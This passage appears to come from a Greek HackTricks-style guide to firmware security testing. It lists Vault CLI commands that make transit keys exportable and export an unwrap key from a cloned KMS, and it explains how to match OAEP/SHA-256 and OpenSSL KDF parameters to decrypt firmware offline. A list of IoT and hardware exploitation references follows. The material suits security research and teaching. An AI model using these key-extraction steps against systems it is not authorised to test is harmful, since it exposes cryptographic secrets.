Με δικαιώματα root στο κλωνοποιημένο KMS:

- Κάντε τα transit keys εξαγώγιμα μόνο μέσα στο απομονωμένο clone: `vault write transit/keys/<name>/config exportable=true`
- Εξαγάγετε το κλειδί unwrap: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το ανακτημένο RSA key με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Αποτυχία αποκρυπτογράφησης PKCS#1 v1.5 και αποτυχία της προεπιλεγμένης αποκρυπτογράφησης OAEP **δεν** αποδεικνύουν ότι το κλειδί είναι λάθος· πολλές ροές που βασίζονται στο Vault χρησιμοποιούν OAEP με SHA-256, ενώ οι συνηθισμένες βιβλιοθήκες έχουν ως προεπιλογή το SHA-1.
- Αν το payload αρχίζει με `Salted__`, αναπαραγάγετε ακριβώς το OpenSSL KDF του κατασκευαστή (`EVP_BytesToKey`, συχνά MD5 σε παλαιότερες συσκευές) πριν επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Έτσι, το «κρυπτογραφημένο firmware» γίνεται ένα γενικότερο πρόβλημα: **ανακτήστε τα λειτουργικά κλειδιά από την πλευρά της συσκευής και, έπειτα, αναπαραγάγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.

## Εκπαίδευση και Πιστοποιήσεις

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Παραβίαση firmware με το Claude: δεξιότητες ανώτερου επιπέδου, αυτονομία αρχάριου επιπέδου](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Μεθοδολογία ελέγχου ασφάλειας firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Πρακτικό IoT Hacking: Ο οριστικός οδηγός για την επίθεση στο Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Εκμετάλλευση zero-day ευπαθειών σε εγκαταλελειμμένο hardware – ιστολόγιο Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Πώς μια έξυπνη συσκευή των $20 μού έδωσε πρόσβαση στο σπίτι σας](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Τώρα με βλέπεις: τώρα έχεις παραβιαστεί](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Εκμετάλλευση του Tesla Wall Connector από τη θύρα φόρτισης - Μέρος 2: παράκαμψη της προστασίας κατά της υποβάθμισης](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Κάν' το να αναβοσβήνει: Εκμετάλλευση μέσω OTA του Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS στο QEMU Μέρος 1: Αποσυσκευασία](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Τεκμηρίωση πυρήνα Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS στο QEMU Μέρος 2: Εντοπισμός σφαλμάτων και επιδιόρθωση](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Κωδικοί πρόσβασης Dell BIOS: Η αδύναμη κρυπτογράφηση XOR επιτρέπει την ανάκτησή τους από SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Εργαλεία ανάκτησης κωδικών πρόσβασης Dell BIOS](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
